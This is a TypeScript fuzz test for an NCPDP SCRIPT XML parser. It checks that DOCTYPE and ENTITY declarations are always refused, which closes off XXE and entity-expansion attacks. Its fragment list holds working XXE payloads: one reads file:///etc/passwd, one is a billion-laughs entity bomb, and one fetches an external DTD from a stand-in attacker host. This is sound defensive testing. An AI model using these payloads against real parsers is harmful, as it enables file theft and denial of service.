/**
 * SCRIPT XML fuzz target — the XXE / entity-expansion boundary (NCPDP-10).
 *
 * `src/script/xml-load.ts` is the security boundary for the XML side: it refuses
 * any `<!DOCTYPE>` / `<!ENTITY>` declaration outright (before the input reaches
 * `fast-xml-parser`) and runs the parser with `processEntities: false`, so no
 * external-entity (XXE) or billion-laughs vector exists. This target hammers
 * that boundary with adversarial XML and asserts two invariants:
 *
 *   1. **Never-throw contract** — `parseScript` on ANY input either returns a
 *      `ScriptMessage` (lenient, with warnings) or throws an
 *      `NcpdpScriptParseError` whose code is one of the sanctioned SCRIPT
 *      fatals. It never throws an unsanctioned error and never hangs (a
 *      billion-laughs payload is rejected at the declaration gate, so it is
 *      never expanded).
 *   2. **Entity-declaration refusal holds** — any input carrying a DOCTYPE or
 *      ENTITY declaration is REFUSED with `NCPDP_SCRIPT_NOT_XML`. The defense is
 *      never leniently parsed past.
 *
 * fast-check derives a fresh seed per run and prints the counterexample + seed
 * on failure; the nightly `fuzz.yml` amplifies `numRuns` via `fuzzRuns`.
 */

import { describe, expect, it } from "vitest";
import fc from "fast-check";

import { parseScript, NcpdpScriptParseError, SCRIPT_FATAL_CODES } from "../../src/index.js";

import { fuzzRuns } from "./_fuzz-config.js";

const SCRIPT_FATAL_CODE_SET = new Set<string>(Object.values(SCRIPT_FATAL_CODES));
const ENTITY_DECL_RE = /<!(?:DOCTYPE|ENTITY)\b/i;

/**
 * Adversarial XML fragments an attacker (or a malformed sender) might submit:
 * classic XXE external/internal entity DTDs, a billion-laughs nested-entity
 * bomb, a SYSTEM-file exfil DTD, plus benign-but-hostile structural noise
 * (deeply nested tags, huge attributes, CDATA, comments, PIs, unclosed tags).
 */
const HOSTILE_FRAGMENTS = [
  '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Message>&xxe;</Message>',
  '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><Message>&lol2;</Message>',
  '<!ENTITY x "expand">',
  '<!DOCTYPE Message SYSTEM "http://evil.example/x.dtd">',
  "<Message>&undefinedEntity;</Message>",
  "<Message><![CDATA[<!ENTITY not-a-real-decl>]]></Message>",
  "<!-- <!ENTITY commented> --><Message/>",
  "<?xml version='1.0'?><Message><Body><NewRx/></Body></Message>",
  "<Message" + "><a".repeat(50) + "/>".repeat(0) + "</Message>",
  '<Message a="' + "A".repeat(500) + '"/>',
  "<Message><Unclosed>",
  "not xml at all",
  "",
  "   ",
] as const;

/** Build a hostile XML string by combining/repeating/wrapping the fragments. */
function hostileXml(): fc.Arbitrary<string> {
  return fc
    .array(fc.constantFrom(...HOSTILE_FRAGMENTS), { minLength: 1, maxLength: 4 })
    .chain((parts) =>
      fc.record({
        parts: fc.constant(parts),
        wrap: fc.boolean(),
        junk: fc.string({ maxLength: 60 }),
      }),
    )
    .map(({ parts, wrap, junk }) => {
      const body = parts.join(junk);
      return wrap ? `<Message>${body}</Message>` : body;
    });
}

describe("SCRIPT XML XXE / entity fuzz", () => {
  it("never throws outside the sanctioned SCRIPT fatals on adversarial XML", () => {
    fc.assert(
      fc.property(hostileXml(), (raw) => {
        try {
          parseScript(raw);
        } catch (err) {
          expect(err).toBeInstanceOf(NcpdpScriptParseError);
          if (err instanceof NcpdpScriptParseError) {
            expect(SCRIPT_FATAL_CODE_SET.has(err.code)).toBe(true);
          }
        }
      }),
      { numRuns: fuzzRuns(300) },
    );
  });

  it("refuses every DOCTYPE/ENTITY declaration with NCPDP_SCRIPT_NOT_XML (XXE boundary holds)", () => {
    fc.assert(
      fc.property(hostileXml(), (raw) => {
        if (!ENTITY_DECL_RE.test(raw)) return; // only the entity-bearing inputs assert the boundary
        expect(() => parseScript(raw)).toThrow(NcpdpScriptParseError);
        try {
          parseScript(raw);
        } catch (err) {
          if (err instanceof NcpdpScriptParseError) {
            expect(err.code).toBe(SCRIPT_FATAL_CODES.NOT_XML);
          }
        }
      }),
      { numRuns: fuzzRuns(300) },
    );
  });
});
